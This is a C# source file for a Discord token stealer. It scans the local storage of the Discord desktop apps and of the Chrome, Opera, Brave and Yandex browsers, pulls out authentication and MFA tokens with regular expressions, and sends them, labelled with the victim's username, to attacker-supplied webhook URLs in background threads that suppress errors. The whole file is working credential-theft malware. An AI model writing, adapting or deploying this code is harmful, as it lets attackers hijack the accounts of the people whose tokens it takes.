using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using System.Linq;
using System.Net.Http;
using System.Threading;

namespace discord_token_grabber
{
    class grabber
    {
        private readonly static List<Service> service_list = new List<Service>()
        {
            new Service("Discord", @"Roaming\Discord"),
            new Service("Discord Canary", @"Roaming\discordcanary", true),
            new Service("Discord PTB", @"Roaming\discordptb"),
            new Service("Google Chrome", @"Local\Google\Chrome\User Data\Default"),
            new Service("Opera", @"Roaming\Opera Software\Opera Stable", true),
            new Service("Brave", @"Local\BraveSoftware\Brave-Browser\User Data\Default", true),
            new Service("Yandex", @"Local\Yandex\YandexBrowser\User Data\Default", true)
        };
        public class Service
        {
            public readonly string _serviceName;
            private readonly string _servicePath;
            private readonly bool _searchLogs;


            public Service(string name, string path, bool logs = false)
            {
                _serviceName = name;
                _servicePath = path;
                _searchLogs = logs;
            }

            public List<string> serviceToken()
            {
                bool checkLogs = _searchLogs;
                string dir = _servicePath;
                string name = _serviceName;
                DirectoryInfo leveldb = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\" + dir + @"\Local Storage\leveldb");
                List<string> tokens = new List<string>();

                try
                {
                    foreach (var file in leveldb.GetFiles(checkLogs ? "*.log" : "*.ldb"))
                    {
                        string contents = file.OpenText().ReadToEnd();
                        foreach (Match match in Regex.Matches(contents, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                            tokens.Add(match.Value);
                        foreach (Match match in Regex.Matches(contents, @"mfa\.[\w-]{84}"))
                            tokens.Add(match.Value);
                    }
                }
                catch { }

                tokens = tokens.Distinct().ToList();
                return tokens;
            }
        }
        public List<string> getAllTokensList()
        {
            List<string> total_tokens = new List<string>();
            foreach (var service in service_list)
            {
                List<string> tokens = service.serviceToken();
                foreach (string token in tokens)
                {
                    total_tokens.Add(token);
                }
            }
            return total_tokens;
        }
        public string getAllTokensString()
        {
            string tokens_strings = "";
            foreach (var service in service_list)
            {
                List<string> tokens = service.serviceToken();
                foreach (string token in tokens)
                {
                    tokens_strings += token + Environment.NewLine;
                }
            }
            return tokens_strings;
        }
        public Dictionary<string, List<string>> getAllTokensDictionary()
        {
            Dictionary<string, List<string>> grabbed = new Dictionary<string, List<string>>();
            foreach (var service in service_list)
            {
                string service_name = service._serviceName;

                List<string> tokens = service.serviceToken();
                if (tokens.Count > 0)
                {
                    grabbed[service_name] = tokens;
                }


            }
            return grabbed;
        }
        public void sendWebhookDict(Dictionary<string, List<string>> grabbed, string webhookUrl)
        {
            try
            {
                HttpClient client = new HttpClient();
                string content_string = "";

                foreach (KeyValuePair<string, List<string>> kvp in grabbed)
                {
                    content_string += $"```diff\n+ {kvp.Key}:\n";
                    foreach (string token in kvp.Value)
                    {
                        content_string += $"{token}\n";
                    }
                    content_string += "```";
                }
                Dictionary<string, string> contents = new Dictionary<string, string>
                    {
                        { "content", $"```diff\n- Token report for '{Environment.UserName}'\n```\n\n{content_string}"},
                        { "username", "C# stealer info:" }
                    };
                client.PostAsync(webhookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
            }
            catch { };
        }
        public void ThreadSendToken(string webhookUrl)
        {
            Dictionary<string, List<string>> grabbed = getAllTokensDictionary();
            Thread send = new Thread(() => sendWebhookDict(grabbed, webhookUrl));
            send.Start();
        }
        public void MultipleThreadSendToken(List<string> webhooksUrl)
        {

            Dictionary<string, List<string>> grabbed = getAllTokensDictionary();
            foreach (string webhookUrl in webhooksUrl)
            {
                Thread send = new Thread(() => sendWebhookDict(grabbed, webhookUrl));
                send.Start();
            }
        }
    }
}
